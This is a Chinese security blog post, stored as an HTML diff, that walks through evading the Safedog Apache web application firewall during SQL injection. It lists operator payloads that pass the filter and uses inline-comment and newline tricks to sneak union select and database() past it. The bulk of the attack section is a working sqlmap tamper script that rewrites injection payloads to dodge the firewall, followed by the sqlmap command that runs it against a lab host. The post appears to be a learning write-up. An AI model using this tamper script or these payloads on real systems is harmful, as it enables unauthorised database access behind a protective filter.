@@ -1,0 +1,155 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="龙幽sama"><meta name="copyright" content="龙幽sama"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>九行代码绕过safedog之apache4.0 | 龙幽sama的网络安全站点</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"longyousama.github.io","root":"/","title":"龙幽的小站","version":"1.5.2","mode":"dark","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><meta name="description" content="0x01.前言近期将常规SQL手工注入学完了，现在学习bypass waf，因为以前遇到这条”狗”比较多，所以就从它开始学习bypass waf，此文章站在巨人的肩膀上学习，思路大致不变。 0x02.bypass判断注入点常规使用and 1&#x3D;1或or 1&#x3D;1都会被拦截，这里采用xor的方法和fuzz的方法进行绕过 运算符绕过and 1&#x3D;1		&#x2F;&#x2F;拦截 or 1&amp;#x3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="九行代码绕过safedog之apache4.0">
+<meta property="og:url" content="http://longyousama.github.io/2021/04/10/%E4%B9%9D%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87safedog%E4%B9%8Bapache4-0/index.html">
+<meta property="og:site_name" content="龙幽sama的网络安全站点">
+<meta property="og:description" content="0x01.前言近期将常规SQL手工注入学完了，现在学习bypass waf，因为以前遇到这条”狗”比较多，所以就从它开始学习bypass waf，此文章站在巨人的肩膀上学习，思路大致不变。 0x02.bypass判断注入点常规使用and 1&#x3D;1或or 1&#x3D;1都会被拦截，这里采用xor的方法和fuzz的方法进行绕过 运算符绕过and 1&#x3D;1		&#x2F;&#x2F;拦截 or 1&amp;#x3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/1.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/2.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/3.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/4.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/5.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/6.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/7.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/9.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/11.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/12.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/8.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/13.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/14.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/15.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/17.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/18.png">
+<meta property="og:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/19.png">
+<meta property="article:published_time" content="2021-04-09T17:27:09.000Z">
+<meta property="article:modified_time" content="2021-04-09T19:15:02.165Z">
+<meta property="article:author" content="龙幽sama">
+<meta property="article:tag" content="WEB渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/1.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><canvas id="trianglifyContainer"></canvas><script defer src="https://cdn.jsdelivr.net/npm/trianglify@4/dist/trianglify.bundle.js"></script><script>document.addEventListener("DOMContentLoaded", () => {
+  const pattern = trianglify({
+    width: 800,
+    height: 600,
+    cellSize: 75,
+    palette: ["YlGnBu", "GnBu", "Purples", "Blues"],
+  });
+  const canvasOpts = {
+    applyCssScaling: false
+  }
+  document.body.appendChild(pattern.toCanvas(trianglifyContainer, canvasOpts));
+});</script><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info mickey-mouse"><a class="site-author-avatar" href="/about/" title="龙幽sama"><img width="96" loading="lazy" src="/images/a.jpg" alt="龙幽sama"></a><div class="site-author-name"><a href="/about/">龙幽sama</a></div><span class="site-name">龙幽sama的网络安全站点</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">5</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">0</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">2</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01.前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-bypass%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">0x02.bypass判断注入点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">运算符绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fuzz%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text">fuzz绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-bypass-%E2%80%9COrder-By%E2%80%9D%E8%AF%AD%E5%8F%A5"><span class="toc-number">3.</span> <span class="toc-text">0x03.bypass “Order By”语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-bypass-%E2%80%9Cunion-all-select%E2%80%9D-amp-amp-%E2%80%9Dunion-select%E2%80%9D%E8%AF%AD%E5%8F%A5"><span class="toc-number">4.</span> <span class="toc-text">0x04.bypass “union all select”&amp;&amp;”union select”语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-bypass-database-%E3%80%81version-%E3%80%81user-%E7%AD%89%E5%87%BD%E6%95%B0"><span class="toc-number">5.</span> <span class="toc-text">0x05.bypass database()、version()、user()等函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-%E7%BC%96%E5%86%99tamper"><span class="toc-number">6.</span> <span class="toc-text">0x06.编写tamper</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://longyousama.github.io/2021/04/10/%E4%B9%9D%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87safedog%E4%B9%8Bapache4-0/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="龙幽sama"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="龙幽sama的网络安全站点"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">九行代码绕过safedog之apache4.0</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2021-04-10 01:27:09" itemprop="dateCreated datePublished" datetime="2021-04-10T01:27:09+08:00">2021-04-10</time></div><div class="post-classify"><span class="post-tag"><a class="tag" href="/tags/WEB%E6%B8%97%E9%80%8F/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">WEB渗透</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01.前言"></a>0x01.前言</h3><p>近期将常规SQL手工注入学完了，现在学习bypass waf，因为以前遇到这条”狗”比较多，所以就从它开始学习bypass waf，此文章站在巨人的肩膀上学习，思路大致不变。</p>
+<h3 id="0x02-bypass判断注入点"><a href="#0x02-bypass判断注入点" class="headerlink" title="0x02.bypass判断注入点"></a>0x02.bypass判断注入点</h3><p>常规使用and 1=1或or 1=1都会被拦截，这里采用xor的方法和fuzz的方法进行绕过</p>
+<h4 id="运算符绕过"><a href="#运算符绕过" class="headerlink" title="运算符绕过"></a>运算符绕过</h4><pre class="line-numbers language-none"><code class="language-none">and 1&#x3D;1		&#x2F;&#x2F;拦截
+or 1&#x3D;1		&#x2F;&#x2F;拦截
+|| -1&#x3D;-1	&#x2F;&#x2F;不拦截
+xor 1&#x3D;1		&#x2F;&#x2F;拦截
+^ 3-1		&#x2F;&#x2F;不拦截<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="fuzz绕过"><a href="#fuzz绕过" class="headerlink" title="fuzz绕过"></a>fuzz绕过</h4><p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/1.png" loading="lazy"></p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/2.png" loading="lazy"></p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/3.png" loading="lazy"></p>
+<p>长度5340被拦截</p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/4.png" loading="lazy"></p>
+<p>长度996成功bypass</p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/5.png" loading="lazy"></p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/6.png" loading="lazy"></p>
+<h3 id="0x03-bypass-“Order-By”语句"><a href="#0x03-bypass-“Order-By”语句" class="headerlink" title="0x03.bypass “Order By”语句"></a>0x03.bypass “Order By”语句</h3><p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/7.png" loading="lazy"></p>
+<h3 id="0x04-bypass-“union-all-select”-amp-amp-”union-select”语句"><a href="#0x04-bypass-“union-all-select”-amp-amp-”union-select”语句" class="headerlink" title="0x04.bypass “union all select”&amp;&amp;”union select”语句"></a>0x04.bypass “union all select”&amp;&amp;”union select”语句</h3><p>前面bypass空格，对select进行fuzz尝试绕过</p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/9.png" loading="lazy"></p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/11.png" loading="lazy"></p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/12.png" loading="lazy"></p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/8.png" loading="lazy"></p>
+<h3 id="0x05-bypass-database-、version-、user-等函数"><a href="#0x05-bypass-database-、version-、user-等函数" class="headerlink" title="0x05.bypass database()、version()、user()等函数"></a>0x05.bypass database()、version()、user()等函数</h3><p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/13.png" loading="lazy"></p>
+<p>前面bypass掉内联注入，使用内联+注释符+换行符绕过</p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/14.png" loading="lazy"></p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/15.png" loading="lazy"></p>
+<h3 id="0x06-编写tamper"><a href="#0x06-编写tamper" class="headerlink" title="0x06.编写tamper"></a>0x06.编写tamper</h3><p>tamper编写教程：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1380102">https://cloud.tencent.com/developer/article/1380102</a></p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+
+&quot;&quot;&quot;
+Copyright (c) 2006-2020 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
+See the file &#39;LICENSE&#39; for copying permission
+&quot;&quot;&quot;
+
+import re
+
+from lib.core.data import kb
+from lib.core.enums import PRIORITY
+
+__priority__ &#x3D; PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+
+    retVal &#x3D; payload
+
+    if payload:
+        retVal &#x3D; payload
+        retVal &#x3D; retVal.replace(&#39;UNION&#39;,&#39;UNION&#x2F;*&#x2F;%1A*&#x2F;&#39;)
+        retVal &#x3D; retVal.replace(&#39;SELECT&#39;,&#39;&#x2F;*!14400SELECT*&#x2F;&#39;)
+        retVal &#x3D; retVal.replace(&#39; &#39;,&#39;&#x2F;*&#x2F;%1A*&#x2F;&#39;)
+        retVal &#x3D; retVal.replace(&#39;DATABASE()&#39;,&#39;&#x2F;*!14400DATABASE%23%0A()*&#x2F;&#39;)
+        retVal &#x3D; retVal.replace(&#39;ORDER&#39;,&#39;ORDER&#x2F;*&#x2F;%1A*&#x2F;&#39;)
+        retVal &#x3D; retVal.replace(&#39;USER()&#39;,&#39;&#x2F;*!14400USER%23%0A()*&#x2F;&#39;)
+        retVal &#x3D; retVal.replace(&#39;VERSION()&#39;,&#39;&#x2F;*!14400VERSION%23%0A()*&#x2F;&#39;)
+        retVal &#x3D; retVal.replace(&#39;SESSION_USER()&#39;,&#39;hex(SESSION_USER(-- B%0a))&#39;)
+        retVal &#x3D; retVal.replace(&#39;UNION ALL SELECT&#39;,&#39;UNION+&#x2F;*&#x2F;%1A*&#x2F;&#x2F;*!14400SELECT*&#x2F;&#39;)
+    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>sqlmap命令:</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo sqlmap -u &quot;http:&#x2F;&#x2F;192.168.91.132:81&#x2F;sql&#x2F;Less-1&#x2F;?id&#x3D;1*&quot;  --tamper&#x3D;safedog_mysql --delay&#x3D;5  --random-agent  -v 3 --batch  --dbs
+
+--tamper			&#x2F;&#x2F;指定tamper脚本
+--delay				&#x2F;&#x2F;延迟的时间，以秒为单位
+--random-agent		&#x2F;&#x2F;随机的UA头
+-v 3				&#x2F;&#x2F;显示payload
+--batch				&#x2F;&#x2F;默认选择
+--dbs				&#x2F;&#x2F;查看可以利用的数据库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/17.png" loading="lazy"></p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/18.png" loading="lazy"></p>
+<p><img src="https://longyou-1258230720.cos.ap-shanghai.myqcloud.com/ATT&CK(%E4%BA%8C)/19.png" loading="lazy"></p>
+</div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>龙幽sama</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://longyousama.github.io/2021/04/10/%E4%B9%9D%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87safedog%E4%B9%8Bapache4-0/" title="九行代码绕过safedog之apache4.0">http://longyousama.github.io/2021/04/10/%E4%B9%9D%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87safedog%E4%B9%8Bapache4-0/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul><script>document.addEventListener('copy', function (event) {
+  const clipboardData = event.clipboardData || window.clipboardData;
+  if (!clipboardData) { return; }
+  const text = window.getSelection().toString();
+  if (text) {
+    event.preventDefault();
+    clipboardData.setData('text/plain', text + '\n\n本文作者：龙幽sama\n本文链接：http://longyousama.github.io/2021/04/10/%E4%B9%9D%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87safedog%E4%B9%8Bapache4-0/\n版权声明：本博客所有文章除特别声明外，均默认采用 CC BY-NC-SA 4.0 许可协议。');
+  }
+});</script></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/03/29/mssql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" rel="next" title="mssql手工注入"><span class="post-nav-text">mssql手工注入</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> 龙幽sama</span></div><div class="live_time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2021-01-01T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
+}
+blog_live_time();
+</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script>const date = new Date();
+const today = (date.getMonth() + 1) + "-" + date.getDate()
+const mourn_days = ["4-4","9-18"]
+if (mourn_days.includes(today)) {
+  document.documentElement.style.filter = "grayscale(1)";
+}</script></div></body></html>
